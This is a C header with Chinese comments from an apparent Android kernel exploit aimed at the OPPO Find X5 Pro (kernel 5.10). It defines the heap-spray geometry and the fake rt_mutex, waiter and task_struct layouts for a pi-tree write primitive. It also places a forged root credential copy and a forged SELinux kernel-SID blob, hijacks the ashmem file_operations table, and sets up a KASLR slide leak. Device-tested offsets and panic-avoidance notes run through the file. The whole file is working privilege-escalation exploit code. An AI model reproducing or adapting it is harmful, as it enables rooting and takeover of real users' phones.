/* ============================================================================
 * pfem10-spray / payload.h — PFEM10 pi-tree 写原语 堆喷占位 + payload 布局
 * ============================================================================
 * 设备   : OPPO Find X5 Pro (PFEM10 / OP5209L1), 内核 5.10.236-android12-9-o
 * 锚点   : KernelSnitch 泄露的 mm_struct（真机实测 0xffffff87879ebfc0）
 * 原理   : base = leaked & ~(ORDER3_SIZE-1)（mm_struct slab 32KB 块）
 *          kill 持有该块的进程 → sendmsg 大 skb 回收同一物理页
 *          payload_base = base + SKB_DATA_DELTA，fake 对象落在页内偏移处
 * 依据   : docs/GhostLock-PFEM10-IonStack技术摘要.md §3
 *          docs/CVE-2026-43499-PFEM10-pi_tree写原语实施笔记.md §3
 *          5.10 源码逐行核对 (repos/ks-sm8450-pfem10/kernel/locking/rtmutex.c)
 *
 * ★ 与设计文档的差异裁定（以 5.10 源码 + pfem10_target.h [C] 编译值为准）:
 *   1. fake_task->pi_lock 用 0x86C（[C]），非设计文档 §3.3 的 0x878（旧稿值,
 *      模型用值; 与 panic 实证 pi_blocked_on=0x898 同源的是 target.h 编译值）。
 *   2. fake_w0（fake_lock 树的哨兵节点）prio 必须 ≤ W 的 prio(120):
 *      [7] 的 rt_mutex_enqueue 用 rt_mutex_waiter_less(严格小于) 决定左右,
 *      W prio=120 时若 fake_w0 prio=130 → 新 waiter 插到左边 → leftmost 被抢 →
 *      [11] waiter==top → 分支1 → rt_mutex_dequeue_pi(fake_task, prerequeue=NULL)
 *      空指针 panic。prio=120 相等 → 插右 → leftmost 保持 fake_w0 → [11] else 干净。
 *   3. fake_lock->waiters 必须预置 rb_node=rb_leftmost=fake_w0（非空树），
 *      否则 [11] 分支1 的 dequeue_pi(NULL) 同样 panic（模型 D2@fresh 实证）。
 * ============================================================================
 */
#ifndef PFEM10_PAYLOAD_H
#define PFEM10_PAYLOAD_H

#include <stdint.h>
#include <stddef.h>
#include "pfem10_target.h"

/* ------------------------- 运行时常量 (39-bit VA) ------------------------- */
/* 直映射公式: alias = PAGE_OFFSET | (image_addr - TEXT_BASE + KPHYS - PHYS_OFFSET)
 * KERNEL_PHYS_LOAD 为 [X] 推断值, 运行时可用 env KPHYS 覆盖 (ghostlock 同款) */
#define PFEM10_PAYLOAD_PAGE_OFFSET     PFEM10_PAGE_OFFSET      /* 0xffffff8000000000 */
#define PFEM10_PAYLOAD_PHYS_OFFSET     PFEM10_PHYS_OFFSET      /* 0x80000000 */
#define PFEM10_PAYLOAD_KERNEL_PHYS_LOAD_DEFAULT PFEM10_KERNEL_PHYS_LOAD /* 0xa8000000 */

/* ------------------------- 喷页几何 (skb 堆喷) ---------------------------- */
#define PFEM10_PAYLOAD_PAGE_SHIFT      12
#define PFEM10_PAYLOAD_PAGE_SIZE       (1UL << PFEM10_PAYLOAD_PAGE_SHIFT) /* 4096 */
#define PFEM10_PAYLOAD_MM_ORDER        PFEM10_MM_SLAB_ORDER     /* 3 */
#define PFEM10_PAYLOAD_ORDER3_SIZE     (PFEM10_PAYLOAD_PAGE_SIZE << PFEM10_PAYLOAD_MM_ORDER) /* 0x8000 */
#define PFEM10_PAYLOAD_SKB_SEND_SIZE   (PFEM10_PAYLOAD_ORDER3_SIZE * 2)  /* 64KB/msg */
#define PFEM10_PAYLOAD_SKB_FRAG_BIAS   0
/* SKB_DATA_DELTA: 用户数据在回收块内的起点偏移.
 * ★ PFEM10 真机实测 = -0xe20 (2026-08-24, v9 SLIDE 写回 boot_id 精确命中 logger 别名;
 *   -0xe80 两轮无写挂起, 设备相关值, 勿用 Find N2 默认)。env SKB_DATA_DELTA 可覆盖. */
#define PFEM10_PAYLOAD_SKB_DATA_DELTA_DEFAULT (-0xe20LL)
#define PFEM10_PAYLOAD_SKB_RECLAIM_SENDS 4

/* ------------------------- mm_struct 回收几何 ----------------------------- */
/* [S] slabinfo: mm_struct 960B(0x3c0) / 34 obj / 8 页块 → order 3 */
#define PFEM10_PAYLOAD_MM_STRUCT_SZ    PFEM10_MM_SLAB_SZ       /* 0x3c0 (slab 步长, 非 sizeof) */
#define PFEM10_PAYLOAD_MM_OBJS_PER_SLAB (PFEM10_PAYLOAD_ORDER3_SIZE / PFEM10_PAYLOAD_MM_STRUCT_SZ)
#define PFEM10_PAYLOAD_MM_PARTIALS     5
#define PFEM10_PAYLOAD_KSNITCH_COLLISIONS_DEFAULT 16   /* 真机实测 16 成功 (attempt 1) */
#define PFEM10_PAYLOAD_PREPARE_SLABS_DEFAULT 32

/* ------------------------- 页内 fake 对象偏移 (喷页布局) ------------------ */
/* 默认取 IonStack 布局（设计文档: 页内偏移 5.10 与 6.x 相同, 均为待实测项;
 * 各对象 8 字节对齐、互不重叠、顶部留 skb_shared_info 余量, 见 layout_probe 校验） */
#define PFEM10_PAYLOAD_LOCK_OFF        0x1350  /* fake_lock: rt_mutex */
#define PFEM10_PAYLOAD_W0_OFF          0x2220  /* fake_w0  : rt_mutex_waiter (树哨兵) */
#define PFEM10_PAYLOAD_FOPS_OFF        0x1000  /* fake_fops: file_operations 表 */
#define PFEM10_PAYLOAD_SCRATCH_OFF     0x3000  /* configfs binwrite 目标 */
#define PFEM10_PAYLOAD_FAKE_TASK_OFF   0x3200  /* fake_task: task_struct 形态 */
#define PFEM10_PAYLOAD_CRED_COPY_OFF   0x3C00  /* 伪造 root cred 副本 (ghostlock-oneplus fill_init_cred_copy 同款, 136B) */
#define PFEM10_PAYLOAD_SECBLOB_OFF     0x3D00  /* 伪造 selinux task_security_struct (osid/sid=KERNEL_SID) */
#define PFEM10_PAYLOAD_RIGHT_OFF       0x4440  /* 辅助 rb 节点 */
#define PFEM10_PAYLOAD_LEFT_OFF        0x5550  /* 辅助 rb 节点 */

/* ------------------------- rt_mutex_waiter (5.10 compact, [C]) ------------- */
#define PFEM10_PAYLOAD_WAITER_PI_TREE_ENTRY_OFF PFEM10_WAITER_PI_TREE_ENTRY /* 0x18 */
#define PFEM10_PAYLOAD_WAITER_TASK_OFF  PFEM10_WAITER_TASK      /* 0x30 */
#define PFEM10_PAYLOAD_WAITER_LOCK_OFF  PFEM10_WAITER_LOCK      /* 0x38 */
#define PFEM10_PAYLOAD_WAITER_PRIO_OFF  PFEM10_WAITER_PRIO      /* 0x40 (int) */
#define PFEM10_PAYLOAD_WAITER_DEADLINE_OFF PFEM10_WAITER_DEADLINE /* 0x48 (u64) */
/* rb 节点内部 (树哨兵/辅助节点共用) */
#define PFEM10_PAYLOAD_RB_PARENT_COLOR_OFF PFEM10_RB_PARENT_COLOR /* 0x00 */
#define PFEM10_PAYLOAD_RB_RIGHT_OFF    PFEM10_RB_RIGHT          /* 0x08 */
#define PFEM10_PAYLOAD_RB_LEFT_OFF     PFEM10_RB_LEFT           /* 0x10 */

/* ------------------------- fake_task 字段偏移 ([C] 编译值) ----------------- */
#define PFEM10_PAYLOAD_FAKE_TASK_USAGE_OFF        PFEM10_TASK_USAGE          /* 0x40 */
#define PFEM10_PAYLOAD_FAKE_TASK_PRIO_OFF         PFEM10_TASK_PRIO           /* 0x84 */
#define PFEM10_PAYLOAD_FAKE_TASK_NORMAL_PRIO_OFF  PFEM10_TASK_NORMAL_PRIO    /* 0x8C */
#define PFEM10_PAYLOAD_FAKE_TASK_TASK_GROUP_OFF   PFEM10_TASK_SCHED_TASK_GROUP /* 0x310 */
#define PFEM10_PAYLOAD_FAKE_TASK_PI_LOCK_OFF      PFEM10_TASK_PI_LOCK        /* 0x86C */
#define PFEM10_PAYLOAD_FAKE_TASK_PI_WAITERS_OFF   PFEM10_TASK_PI_WAITERS     /* 0x880 */
#define PFEM10_PAYLOAD_FAKE_TASK_PI_TOP_TASK_OFF  PFEM10_TASK_PI_TOP_TASK    /* 0x890 */
#define PFEM10_PAYLOAD_FAKE_TASK_PI_BLOCKED_ON_OFF PFEM10_TASK_PI_BLOCKED_ON /* 0x898 */

/* ------------------------- fake 值 ------------------------ */
#define PFEM10_PAYLOAD_FAKE_TASK_PRIO   120
#define PFEM10_PAYLOAD_FAKE_WAITER_PRIO 130   /* fd_set out[3]: [3] requeue 判定 (≠ W 120) */
#define PFEM10_PAYLOAD_FAKE_W0_PRIO     120   /* ★ 树哨兵 prio: 必须 ≤ W prio(120), 见文件头 */
#define PFEM10_PAYLOAD_FAKE_TASK_USAGE  0x100 /* 远离 0/1, [10]/[12] get/put 不触发 free */

/* ------------------------- payload 模式 ------------------- */
#define PFEM10_PAYLOAD_FOPS  0   /* 打 ashmem misc.fops = fake_fops → configfs 读写 */
#define PFEM10_PAYLOAD_SLIDE 1   /* 打 sysctl_bootid 数据槽 = logger 别名 → 泄 KASLR slide */

/* ------------------------- fake fops 表 (5.10 布局, [C]) --- */
#define PFEM10_PAYLOAD_FOPS_LLSEEK_OFF       PFEM10_FOPS_LLSEEK       /* 0x08 */
#define PFEM10_PAYLOAD_FOPS_READ_OFF         PFEM10_FOPS_READ         /* 0x10 */
#define PFEM10_PAYLOAD_FOPS_WRITE_OFF        PFEM10_FOPS_WRITE        /* 0x18 */
#define PFEM10_PAYLOAD_FOPS_READ_ITER_OFF    PFEM10_FOPS_READ_ITER    /* 0x20 (5.10 置 0) */
#define PFEM10_PAYLOAD_FOPS_WRITE_ITER_OFF   PFEM10_FOPS_WRITE_ITER   /* 0x28 (5.10 置 0) */
#define PFEM10_PAYLOAD_FOPS_IOCTL_OFF        PFEM10_FOPS_IOCTL        /* 0x50 */
#define PFEM10_PAYLOAD_FOPS_COMPAT_IOCTL_OFF PFEM10_FOPS_COMPAT_IOCTL /* 0x58 */
#define PFEM10_PAYLOAD_FOPS_MMAP_OFF         PFEM10_FOPS_MMAP         /* 0x60 */
#define PFEM10_PAYLOAD_FOPS_OPEN_OFF         PFEM10_FOPS_OPEN         /* 0x70 */
#define PFEM10_PAYLOAD_FOPS_RELEASE_OFF      PFEM10_FOPS_RELEASE      /* 0x80 */
#define PFEM10_PAYLOAD_FOPS_SPLICE_READ_OFF  PFEM10_FOPS_SPLICE_READ  /* 0xC0 (PFEM10 置 0) */
#define PFEM10_PAYLOAD_FOPS_SHOW_FDINFO_OFF  PFEM10_FOPS_SHOW_FDINFO  /* 0xE0 */

/* ------------------------- 全局符号 (image 偏移) ---------- */
#define PFEM10_PAYLOAD_OFF_INIT_TASK         PFEM10_OFF_INIT_TASK        /* 0x027CC000 */
#define PFEM10_PAYLOAD_OFF_ROOT_TASK_GROUP   PFEM10_OFF_ROOT_TASK_GROUP  /* 0x029C8040 */
#define PFEM10_PAYLOAD_OFF_ASHMEM_MISC_FOPS  PFEM10_OFF_ASHMEM_MISC_FOPS /* 0x0291A8E8 */
#define PFEM10_PAYLOAD_OFF_NOOP_LLSEEK       PFEM10_OFF_NOOP_LLSEEK      /* 0x0056CF70 */
#define PFEM10_PAYLOAD_OFF_ASHMEM_IOCTL      PFEM10_OFF_ASHMEM_IOCTL
#define PFEM10_PAYLOAD_OFF_ASHMEM_COMPAT_IOCTL PFEM10_OFF_ASHMEM_COMPAT_IOCTL
#define PFEM10_PAYLOAD_OFF_ASHMEM_MMAP       PFEM10_OFF_ASHMEM_MMAP
#define PFEM10_PAYLOAD_OFF_ASHMEM_OPEN       PFEM10_OFF_ASHMEM_OPEN
#define PFEM10_PAYLOAD_OFF_ASHMEM_RELEASE    PFEM10_OFF_ASHMEM_RELEASE
#define PFEM10_PAYLOAD_OFF_ASHMEM_SHOW_FDINFO PFEM10_OFF_ASHMEM_SHOW_FDINFO
#define PFEM10_PAYLOAD_OFF_CONFIGFS_READ_BIN_FILE  PFEM10_OFF_CONFIGFS_READ_BIN_FILE
#define PFEM10_PAYLOAD_OFF_CONFIGFS_WRITE_BIN_FILE PFEM10_OFF_CONFIGFS_WRITE_BIN_FILE
#define PFEM10_PAYLOAD_OFF_CONFIGFS_OPEN_BIN_FILE  PFEM10_OFF_CONFIGFS_OPEN_BIN_FILE
#define PFEM10_PAYLOAD_OFF_CONFIGFS_RELEASE_BIN_FILE PFEM10_OFF_CONFIGFS_RELEASE_BIN_FILE
/* .cfi_jt 蹦床 (vmlinux nm 实证; 真实 fops 表存 cfi_jt 地址, fake 表同约定) */
#define PFEM10_PAYLOAD_OFF_CONFIGFS_READ_BIN_FILE_CFI_JT  PFEM10_OFF_CONFIGFS_READ_BIN_FILE_CFI_JT
#define PFEM10_PAYLOAD_OFF_CONFIGFS_WRITE_BIN_FILE_CFI_JT PFEM10_OFF_CONFIGFS_WRITE_BIN_FILE_CFI_JT
#define PFEM10_PAYLOAD_OFF_ASHMEM_IOCTL_CFI_JT        PFEM10_OFF_ASHMEM_IOCTL_CFI_JT
#define PFEM10_PAYLOAD_OFF_ASHMEM_COMPAT_IOCTL_CFI_JT PFEM10_OFF_ASHMEM_COMPAT_IOCTL_CFI_JT
#define PFEM10_PAYLOAD_OFF_ASHMEM_OPEN_CFI_JT         PFEM10_OFF_ASHMEM_OPEN_CFI_JT
/* SLIDE (KASLR 无关直映射别名) */
#define PFEM10_PAYLOAD_OFF_SLIDE_NFULNL_LOGGER PFEM10_OFF_SLIDE_NFULNL_LOGGER /* 0x027C14B8 */
#define PFEM10_PAYLOAD_OFF_SLIDE_LOGGERS_0_1  PFEM10_OFF_SLIDE_LOGGERS_0_1  /* 0x027C13F0 */
#define PFEM10_PAYLOAD_OFF_SLIDE_BOOT_ID      PFEM10_OFF_SLIDE_BOOT_ID      /* 0x02B99B6D */

/* 全局锚点/布局输出 (payload.c 填充, layout_probe 只读计算) */
struct pfem10_payload_layout {
    uintptr_t mm_struct;        /* KernelSnitch 泄露的 mm_struct 地址 */
    uintptr_t base;             /* 32KB slab 块锚点 = mm & ~(0x8000-1) */
    int64_t   skb_data_delta;   /* SKB_DATA_DELTA (env 可覆盖) */
    uintptr_t payload_base;     /* base + delta: skb 用户数据起点 */
    uintptr_t fake_lock;        /* payload_base + LOCK_OFF */
    uintptr_t fake_w0;          /* payload_base + W0_OFF   (树哨兵) */
    uintptr_t fake_fops;        /* payload_base + FOPS_OFF (FOPS 模式) */
    uintptr_t fake_task;        /* payload_base + FAKE_TASK_OFF */
    uintptr_t scratch;          /* payload_base + SCRATCH_OFF (binwrite 目标) */
    uintptr_t rb_left;          /* payload_base + LEFT_OFF */
    uintptr_t rb_right;         /* payload_base + RIGHT_OFF */
};

/* 锚点推导 (纯算术, 主机/设备通用) */
static inline struct pfem10_payload_layout
pfem10_layout_from_mm(uintptr_t mm, int64_t delta)
{
    struct pfem10_payload_layout L;
    L.mm_struct      = mm;
    L.base           = mm & ~(uintptr_t)(PFEM10_PAYLOAD_ORDER3_SIZE - 1);
    L.skb_data_delta = delta;
    L.payload_base   = (uintptr_t)((int64_t)L.base + delta);
    L.fake_lock      = L.payload_base + PFEM10_PAYLOAD_LOCK_OFF;
    L.fake_w0        = L.payload_base + PFEM10_PAYLOAD_W0_OFF;
    L.fake_fops      = L.payload_base + PFEM10_PAYLOAD_FOPS_OFF;
    L.fake_task      = L.payload_base + PFEM10_PAYLOAD_FAKE_TASK_OFF;
    L.scratch        = L.payload_base + PFEM10_PAYLOAD_SCRATCH_OFF;
    L.rb_left        = L.payload_base + PFEM10_PAYLOAD_LEFT_OFF;
    L.rb_right       = L.payload_base + PFEM10_PAYLOAD_RIGHT_OFF;
    return L;
}

/* 直映射别名: alias = PAGE_OFFSET | (image_off + (KPHYS - PHYS_OFFSET)) */
static inline uintptr_t
pfem10_data_alias(uintptr_t image_off, uintptr_t kphys)
{
    return PFEM10_PAYLOAD_PAGE_OFFSET |
           (image_off + (kphys - PFEM10_PAYLOAD_PHYS_OFFSET));
}

#endif /* PFEM10_PAYLOAD_H */
